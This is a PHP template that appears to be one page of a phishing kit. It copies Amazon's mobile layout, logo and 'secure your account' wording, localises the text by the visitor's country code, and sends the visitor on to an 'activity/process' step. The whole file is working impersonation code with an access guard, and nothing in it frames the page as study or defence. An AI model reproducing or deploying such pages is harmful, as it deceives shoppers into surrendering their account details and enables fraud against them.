<?php 
defined("ACCESS") or die('Konz');

$country=trim($_SESSION['countryCode']);
include FCPATH. "AREA16/system/language/lang.php";
?>
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.3-2021-04-08">

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
	<title>
		<?php echo $_33 ?>
	</title>
	<link rel="shortcut icon" href="<?=base_url()?>AREA16/assets/images/favicon.ico" />
	<link rel="stylesheet" href="<?=base_url()?>AREA16/assets/css/activity2.css">
	<style>
	.chimera-body-container {
		width: 25.7em !important;
		max-width: 100%;
		margin-left: auto;
		margin-right: auto;
	}
	</style>
</head>

<body class="a-color-offset-background a-m-us a-aui_72554-c a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c" cz-shortcut-listen="true">
	<div id="a-page">
		<div id="header" class="a-section a-spacing-none">
			<div class="a-container a-global-nav-wrapper">
				<div class="a-section a-spacing-none a-text-center">
					<a class="a-link-nav-icon" href="#"> <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i> </a>
				</div>
			</div>
		</div>
		<div id="body" class="a-section a-padding-base a-text-center">
			<div class="a-section a-text-left chimera-body-container">
				<div class="a-section a-spacing-mini a-spacing-top-micro a-text-center"> <img src="<?=base_url()?>AREA16/assets/images/secure.png" height="20%" width="20%"></div>
				<div class="a-section a-spacing-mini a-text-left">
					<h1 class="a-size-large secure-your-account-word-break"><?php echo $_34 ?></h1> </div>
				<div class="a-section a-spacing-small secure-your-account-word-break">
					<?php echo $_35 ?>
				</div>
				<div class="a-box a-spacing-mini a-text-left">
					<div class="a-box-inner a-padding-base">
						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-base secure-your-account-word-break a-text-bold"><?php echo $_36 ?></span> <span class="a-size-base secure-your-account-word-break"><?php echo $_37 ?></span> </div>
						<hr aria-hidden="true" class="a-spacing-mini a-divider-normal">
						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-base secure-your-account-word-break"><?php echo $_38 ?></span></div>
						<div class="a-row a-spacing-mini a-spacing-top-small"><span class="a-size-small secure-your-account-word-break"><b><?php echo $_39 ?></b> <?php echo $_40 ?></span></div>
					</div>
				</div>
				<div class="a-box a-spacing-mini a-text-left">
					<div class="a-box-inner a-padding-base">
						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-base secure-your-account-word-break a-text-bold"><?php echo $_41 ?></span> <span class="a-size-base secure-your-account-word-break"><?php echo $_42 ?></span> </div>
						<hr aria-hidden="true" class="a-spacing-mini a-divider-normal">
						<div class="a-row a-spacing-mini a-spacing-top-micro">
							<div id="sign_out_everything_number_of_apps" class="a-box a-alert-inline a-alert-inline-warning">
								<div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
									<div class="a-alert-content"> <span class="a-size-base secure-your-account-word-break"><?php echo $_43 ?></span> </div>
								</div>
							</div>
						</div>
						<div class="a-row a-spacing-mini a-spacing-top-micro"><span class="a-size-small secure-your-account-word-break"><b><?php echo $_39 ?></b> <?php echo $_44 ?></span></div>
					</div>
				</div><span id="sya-done-button" class="a-button a-spacing-top-base a-button-span12 a-button-base"><span class="a-button-inner"><a href="<?=base_url()?>activity/process" class="a-button-text" role="button"><?php echo $_7 ?></a></span></span>
				<style>
				.secure-your-account-word-break {
					word-break: break-word;
				}
				</style>
			</div>
		</div>
		<div class="a-row auth-footer">
			<style>
			.auth-footer-separator {
				display: inline-block;
				width: 20px;
			}
			</style>
			<div class="a-divider a-divider-section">
				<div class="a-divider-inner"></div>
			</div>
			<div id="footer" class="a-section">
				<div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-separator"></span>
					<a class="a-link-normal" target="_blank" rel="noopener" href="#">
						<?php echo $_21 ?>
					</a> <span class="auth-footer-separator"></span>
					<a class="a-link-normal" target="_blank" rel="noopener" href="#">
						<?php echo $_22 ?>
					</a> <span class="auth-footer-separator"></span>
					<a class="a-link-normal" target="_blank" rel="noopener" href="#">
						<?php echo $_23 ?>
					</a> <span class="auth-footer-separator"></span> </div>
				<div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
			</div>
		</div>
	</div>
</body>

</html>